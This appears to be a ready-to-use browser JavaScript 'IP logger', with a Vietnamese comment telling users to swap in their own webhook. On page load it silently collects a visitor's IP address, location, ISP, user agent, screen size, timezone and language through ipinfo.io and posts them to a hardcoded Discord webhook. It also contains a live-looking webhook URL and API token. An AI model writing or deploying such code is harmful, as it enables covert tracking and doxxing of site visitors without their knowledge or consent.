const webhook = "https://discord.com/api/webhooks/1395737547962843207/qVV9cmy5-6cYJv_jGOGOI1y3Ahe9hASVD_UVYvU1Yh2POpAinED_2Uxaimv_rCLiNFCK"; // <-- Thay webhook của bạn

(async () => {
  const ipData = await fetch("https://ipinfo.io/json?token=3e01801adba7e3").then(res => res.json());

  const data = {
    ip: ipData.ip,
    city: ipData.city,
    region: ipData.region,
    country: ipData.country,
    org: ipData.org,
    userAgent: navigator.userAgent,
    screen: `${screen.width}x${screen.height}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    language: navigator.language,
    time: new Date().toLocaleString("vi-VN"),
    source: "IP-Based"
  };

  const message = {
    content: "📡 **New Visitor Info**",
    embeds: [
      {
        title: "Visitor Details",
        color: 0x00ffff,
        fields: Object.entries(data).map(([k, v]) => ({
          name: k,
          value: String(v),
          inline: false
        })),
        footer: {
          text: "Auto Logger | Discord Webhook"
        },
        timestamp: new Date().toISOString()
      }
    ]
  };

  fetch(webhook, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(message)
  });
})();
